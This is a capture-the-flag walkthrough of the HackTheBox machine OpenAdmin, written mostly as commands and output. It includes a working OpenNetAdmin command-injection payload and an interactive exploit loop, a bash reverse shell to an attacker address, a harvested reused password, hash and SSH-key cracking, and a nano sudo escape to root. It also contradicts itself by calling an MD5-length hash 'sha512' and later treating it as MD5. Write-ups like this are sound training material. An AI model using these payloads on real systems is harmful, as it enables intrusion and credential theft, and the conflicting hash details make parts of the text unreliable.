# HackTheBox — OpenAdmin

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Linux  
**Category:** Web Exploitation / OpenNetAdmin RCE / sudo nano  
**Status:** Retired  

---

## Summary

OpenAdmin runs a vulnerable version of OpenNetAdmin (CVE-2019-26057) that allows unauthenticated RCE. After gaining initial access, credentials in a config file enable lateral movement to another user, who can run `nano` as root via sudo — exploitable with a classic GTFOBins escape.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/openadmin 10.10.10.171
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1
80/tcp open  http    Apache httpd 2.4.29
```

---

## Web Enumeration

### Gobuster

```bash
gobuster dir -u http://10.10.10.171/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
/music/
/artwork/
/sierra/
/ona/      ← OpenNetAdmin
```

### OpenNetAdmin Version

Visiting `http://10.10.10.171/ona/` reveals:

```
You are NOT on the latest release version
Your version: 18.1.1
```

---

## Exploitation

### CVE-2019-26057 — OpenNetAdmin 18.1.1 RCE

```bash
curl -s -X POST http://10.10.10.171/ona/ \
  --data 'xajaxargs[]=&xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo+BEGIN;id;echo+END&xajaxargs[]=ping'
```

Or use the public exploit:

```bash
# exploit.sh
URL="http://10.10.10.171/ona/"
while true; do
  echo -n "$ "
  read cmd
  curl -s \
    -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;${cmd}&xajaxargs[]=ping" \
    $URL | grep -oPm 1 "(?<=<br/>).*(?=<\/pre>)"
done
```

Gives a semi-interactive shell as **www-data**.

Get a proper reverse shell:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'
```

---

## Lateral Movement — www-data → jimmy

### Config File Credentials

```bash
find /opt/ona -name "*.conf" -o -name "*.php" 2>/dev/null | xargs grep -l "password" 2>/dev/null
cat /opt/ona/www/local/config/database_settings.inc.php
```

```php
'db_passwd' => 'n1nj4W4rri0R!'
```

Try this password for system users:

```bash
su jimmy
# Password: n1nj4W4rri0R! ✓
```

---

## Lateral Movement — jimmy → joanna

### Internal Web Server

```bash
netstat -tlnp
# 127.0.0.1:52846 (internal site)
```

```bash
ls /var/www/internal/
# index.php  login.php  main.php
cat /var/www/internal/main.php
```

`main.php` runs as joanna and outputs her SSH private key.

Find the hash of the login:

```bash
cat /var/www/internal/index.php
# sha512 hash: 2b22337f218b2d82dfc3b6f77e7cb8ec
```

This is the hash for `Revealed` or crack it:

```bash
echo "2b22337f218b2d82dfc3b6f77e7cb8ec" | hashcat -m 0 /usr/share/wordlists/rockyou.txt
# Revealed
```

Access the internal site via port forward or curl:

```bash
curl -s -d "username=jimmy&password=Revealed" http://127.0.0.1:52846/index.php
curl -s --cookie "PHPSESSID=..." http://127.0.0.1:52846/main.php
```

Joanna's SSH key is returned. Copy it, crack with john:

```bash
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
# bloodninjas
```

```bash
ssh -i id_rsa joanna@10.10.10.171
# Passphrase: bloodninjas
```

---

## User Flag

```bash
cat /home/joanna/user.txt
```

---

## Privilege Escalation

```bash
sudo -l
# (ALL) NOPASSWD: /bin/nano /opt/priv
```

### GTFOBins — nano sudo escape

```bash
sudo /bin/nano /opt/priv
```

Inside nano:
1. `Ctrl+R` then `Ctrl+X` (to execute a command)
2. Type: `reset; sh 1>&0 2>&0`

**Root shell obtained.**

---

## Root Flag

```bash
cat /root/root.txt
```

---

## Key Takeaways

- OpenNetAdmin is a classic RCE — always version-check discovered web applications
- PHP config files frequently contain database passwords reused as system passwords
- Internal services on localhost can be accessed via `curl` or port forwarding
- MD5 hashes in PHP login scripts are trivially crackable — inspect source before brute-forcing
- `nano` can escape sudo via `Ctrl+R` → `Ctrl+X` — check GTFOBins for any sudo-allowed editor

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| gobuster | Web enumeration |
| curl | ONA RCE exploitation |
| hashcat / john | Hash cracking |
| ssh | Lateral movement |
| GTFOBins | nano privesc reference |
